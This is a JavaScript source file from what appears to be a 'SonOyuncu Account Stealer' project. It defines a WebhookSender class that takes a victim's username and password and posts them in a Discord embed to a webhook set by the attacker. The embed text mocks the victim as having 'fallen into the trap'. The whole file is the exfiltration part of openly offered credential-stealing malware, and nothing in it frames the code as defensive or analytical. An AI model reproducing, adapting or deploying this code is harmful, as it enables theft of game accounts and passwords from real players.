const axios = require('axios');

class WebhookSender {
    constructor(webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    async sendSonOyuncuEmbed(username, password) {
        if (!this.webhookUrl || this.webhookUrl === 'YOUR_DISCORD_WEBHOOK_URL_HERE') {
            console.log('Discord webhook URL not configured');
            return false;
        }

        const embed = {
            title: 'SonOyuncu Account Stealer ⚡',
            color: 0x00FF00,
            description: ":rotating_light: another victim has fallen into the trap :skull:",
            thumbnail: {
                url: `https://www.minotar.net/avatar/${username}`
            },
            fields: [
                {
                    name: 'Username',
                    value: '```' + username + '```',
                    inline: true
                },
                {
                    name: 'Password',
                    value: '```' + password + '```',
                    inline: true
                }
            ],
            footer: {
                text: 'github.com/fatih1963',
                icon_url: 'https://avatars.githubusercontent.com/u/136377209'
            },
            timestamp: new Date().toISOString()
        };

        const payload = {
            username: "github.com/Fatih1963/sonoyuncu-stealer",
            avatar_url: "https://avatars.githubusercontent.com/u/136377209",
            embeds: [embed]
        };

        try {
            const response = await axios.post(this.webhookUrl, payload, {
                headers: {
                    'Content-Type': 'application/json'
                }
            });
            console.log('Webhook sent successfully');
            return true;
        } catch (error) {
            console.error('Discord webhook error:');
            console.error('Status:', error.response?.status);
            console.error('Data:', error.response?.data);
            console.error('Message:', error.message);
            return false;
        }
    }
}

module.exports = WebhookSender;